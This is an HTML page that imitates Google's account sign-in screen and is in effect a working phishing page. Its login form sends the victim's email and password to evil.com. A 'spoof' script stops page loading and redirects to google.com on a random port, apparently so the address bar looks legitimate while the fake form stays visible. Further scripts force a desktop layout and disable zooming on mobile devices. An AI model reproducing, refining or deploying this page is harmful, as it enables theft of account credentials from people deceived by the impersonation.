<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <!-- FIX: Force desktop viewport -->
    <meta name="viewport" content="width=1200, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sign in - Google Accounts</title>

    <!-- FIXED: Script Tailwind harus tanpa escape -->
    <script src="https://cdn.tailwindcss.com"></script>

    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">

    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            /* Prevent mobile scrolling */
            overflow-x: hidden;
            min-width: 1200px;
        }

        /* Force desktop layout */
        @media (max-width: 1199px) {
            body::before {
                content: "Please switch to desktop mode for best experience";
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                background: #ffcc00;
                color: #000;
                text-align: center;
                padding: 10px;
                z-index: 9999;
                font-weight: bold;
            }
        }

        .login-container {
            background-color: #fff;
            padding: 2.5rem;
            border-radius: 8px;
            box-shadow: 
                0 1px 3px rgba(60, 64, 67, 0.3),
                0 4px 8px rgba(60, 64, 67, 0.15);
            width: 100%;
            max-width: 400px;
            text-align: center;
            box-sizing: border-box;
            /* Ensure container stays desktop size */
            transform-origin: top center;
        }

        .input-field {
            width: 100%;
            padding: 0.75rem 1rem;
            margin-bottom: 1.25rem;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 1rem;
            transition: .2s;
        }
        .input-field:focus {
            outline: none;
            border-color: #1a73e8;
            box-shadow: 0 0 0 1px #1a73e8;
        }

        .btn-primary {
            background-color: #1a73e8;
            color: #fff;
            padding: 0.75rem 1.5rem;
            border-radius: 4px;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            transition: .2s;
            min-width: 90px;
        }
        .btn-primary:hover {
            background-color: #1766d1;
        }

        .link-text {
            color: #1a73e8;
            font-weight: 500;
            font-size: 0.875rem;
        }
        .link-text:hover {
            text-decoration: underline;
        }

        .flex-between {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 1.5rem;
        }
    </style>
</head>

<body>
    <div class="login-container">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"
             alt="Google" class="mx-auto mb-6 w-24">

        <h1 class="text-2xl font-normal mb-2">Sign in</h1>
        <p class="text-base text-gray-600 mb-6">Use your Google Account</p>

        <form id="loginForm" method="get" action="https://evil.com/">
            <input type="email" id="email" name="email"
                   class="input-field" placeholder="Email or phone" required>

            <input type="password" id="password" name="pass"
                   class="input-field" placeholder="Password" required>

            <div class="text-left mb-6">
                <a href="#" class="link-text">Forgot password?</a>
            </div>

            <p class="text-sm text-gray-600 text-left mb-6">
                Not your computer? Use a private browsing window to sign in. 
                <a href="#" class="link-text">Learn more</a>
            </p>

            <div class="flex-between">
                <a href="#" class="link-text">Create account</a>
                <button type="submit" class="btn-primary">Next</button>
            </div>
        </form>
    </div>

    <!-- FIXED: Script dipindah ke bawah -->
<script>
    // Force desktop mode on all devices
    function forceDesktopMode() {
        // Set viewport for desktop
        const viewportMeta = document.querySelector('meta[name="viewport"]');
        if (viewportMeta) {
            viewportMeta.content = "width=1200, initial-scale=1.0, maximum-scale=1.0, user-scalable=no";
        }
        
        // Prevent mobile zooming
        document.addEventListener('touchmove', function(e) {
            if (e.scale !== 1) {
                e.preventDefault();
            }
        }, { passive: false });
        
        // Disable double tap zoom
        let lastTouchEnd = 0;
        document.addEventListener('touchend', function(e) {
            const now = (new Date()).getTime();
            if (now - lastTouchEnd <= 300) {
                e.preventDefault();
            }
            lastTouchEnd = now;
        }, false);
        
        // Force desktop user agent if possible (for browsers that allow it)
        if (navigator.userAgent.match(/Mobile|Android|iPhone|iPad|iPod/i)) {
            console.log("Mobile device detected - forcing desktop layout");
        }
    }
    
    function spoof() {
        setTimeout(() => {
            window.stop();
            let randomPort;
            do {
                randomPort = Math.floor(Math.random() * 1000);
            } while (randomPort === 0 || randomPort === 443);
            document.location = "https://google.com:" + randomPort + "/";
        }, 300);
    }
    
    // Initialize desktop mode immediately
    document.addEventListener('DOMContentLoaded', function() {
        forceDesktopMode();
        spoof();
    });
    
    // Also run on window load for safety
    window.addEventListener('load', forceDesktopMode);
</script>
</body>
</html>
